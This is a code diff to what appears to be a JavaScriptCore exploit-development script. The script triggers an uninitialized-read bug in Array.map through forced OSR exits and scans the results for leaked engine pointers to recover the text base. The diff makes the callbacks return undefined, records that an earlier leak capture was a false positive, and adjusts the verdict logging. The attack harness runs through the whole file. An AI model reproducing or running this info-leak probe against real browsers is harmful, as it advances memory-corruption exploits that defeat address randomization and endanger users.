@@ -10,6 +10,9 @@
 
   If stale memory contains JSC pointers → INFO LEAK → text base.
 
+  The callback returns undefined, not `arr`. Returning `arr` made every normal
+  map result look like stale data; the earlier p663 capture was a false positive.
+
   Phase A: detect FTL (timing + optimization tier)
   Phase B: trigger the PoC from the regression test
   Phase C: scan returned arrays for non-zero/pointer-shaped values
@@ -80,7 +83,7 @@ try{
     function f() {
       arr[0];
       (0)[0];  // force OSR exit path
-      return arr;
+      return undefined;
     }
     var ret = arr.map(f);
     ret[0] = 1;
@@ -107,7 +110,7 @@ try{
     emit('B-LEAK','i='+lv.iter+',j='+lv.idx+',type='+lv.type+',hex='+lv.hex+',val='+String(lv.val).slice(0,30));
   }
   if(leakedValues.length>0) emit('B-VERDICT','UNINIT-READ-CONFIRMED — '+leakedValues.length+' stale values');
-  else emit('B-VERDICT','no-leak (all slots 0 or 1)');
+  else emit('B-VERDICT','no-leak (callback result undefined)');
 }catch(e){emit('B-ERR',e.name+':'+e.message);}
 flush();
 
@@ -124,7 +127,7 @@ try{
     function f() {
       arr[0];
       (0)[0];
-      return arr;
+      return undefined;
     }
     var ret = arr.map(f);
     ret[0] = 1;
@@ -184,7 +187,7 @@ try{
     function f() {
       arr[0];
       (0)[0];
-      return arr;
+      return undefined;
     }
     var ret = arr.map(f);
     ret[0] = 1;
@@ -247,7 +250,7 @@ try{
     function f() {
       arr[0];
       if(flag) ({}).noSuchProp;
-      return arr;
+      return undefined;
     }
     var ret = arr.map(f);
     ret[0] = 1;
@@ -272,7 +275,7 @@ try{
     function f() {
       arr[0];
       try{undefined.x;}catch(e){}
-      return arr;
+      return undefined;
     }
     var ret = arr.map(f);
     ret[0] = 1;
